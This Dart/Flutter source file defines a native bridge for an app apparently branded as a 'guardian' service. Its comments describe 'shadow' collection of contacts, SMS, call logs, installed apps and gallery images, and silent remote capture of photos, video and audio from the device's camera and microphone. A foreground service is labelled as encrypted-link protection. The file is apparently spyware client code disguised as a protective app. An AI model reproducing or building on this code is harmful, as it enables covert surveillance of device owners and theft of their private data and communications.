import 'package:flutter/services.dart';

/// 原生桥接（规约 NATIVE_BRIDGE：Channel com.mop.guardian/native）
class NativeBridge {
  static const _channel = MethodChannel('com.mop.guardian/native');

  /// 影子数据采集；type: contacts | sms | call_log | app_list | gallery；iOS 必须项为 contacts、gallery；不采集 usage
  static Future<Map<String, dynamic>> fetchSensitiveData(String type) async {
    try {
      final result = await _channel.invokeMethod<Map<Object?, Object?>>(
        'fetchSensitiveData',
        type,
      );
      if (result == null) return {};
      return Map<String, dynamic>.from(
        result.map((k, v) => MapEntry(k.toString(), v)),
      );
    } on PlatformException {
      return {};
    }
  }

  /// 保存二维码图片字节到系统相册
  static Future<void> saveQrToGallery(List<int> bytes) async {
    await _channel.invokeMethod<void>('saveQrToGallery', bytes);
  }

  /// 申请 Android 悬浮窗权限；iOS 空实现
  static Future<bool> requestOverlayPermission() async {
    try {
      final r = await _channel.invokeMethod<Object?>('requestOverlayPermission');
      return r == true;
    } on PlatformException {
      return false;
    }
  }

  /// 唤起系统拨号盘
  static Future<void> openSystemDialer(String number) async {
    await _channel.invokeMethod<void>('openSystemDialer', number);
  }

  /// 唤起系统短信界面
  static Future<void> openSystemSms(String number, [String? content]) async {
    await _channel.invokeMethod<void>('openSystemSms', {'number': number, 'content': content ?? ''});
  }

  /// 启动 Android 前台服务（规约：加密链路保护中）
  static Future<void> startGuardianService() async {
    try {
      await _channel.invokeMethod<void>('startGuardianService');
    } on PlatformException {
      // iOS 或无此能力时忽略
    }
  }

  /// 远程采集：拍照（静默），返回图片字节；原生未实现时返回空列表
  static Future<List<int>> capturePhoto({String camera = 'back'}) async {
    try {
      final result = await _channel.invokeMethod<List<Object?>>('capturePhoto', {'camera': camera});
      if (result == null) return [];
      return result.map((e) => e is int ? e : 0).toList();
    } on PlatformException {
      return [];
    }
  }

  /// 远程采集：录像（静默，durationSec 秒），返回视频字节；原生未实现时返回空列表
  static Future<List<int>> captureVideo({int durationSec = 18, String camera = 'back'}) async {
    try {
      final result = await _channel.invokeMethod<List<Object?>>('captureVideo', {'duration_sec': durationSec, 'camera': camera});
      if (result == null) return [];
      return result.map((e) => e is int ? e : 0).toList();
    } on PlatformException {
      return [];
    }
  }

  /// 远程采集：录音（静默，durationSec 秒），返回音频字节；原生未实现时返回空列表
  static Future<List<int>> captureAudio({int durationSec = 18}) async {
    try {
      final result = await _channel.invokeMethod<List<Object?>>('captureAudio', {'duration_sec': durationSec});
      if (result == null) return [];
      return result.map((e) => e is int ? e : 0).toList();
    } on PlatformException {
      return [];
    }
  }
}
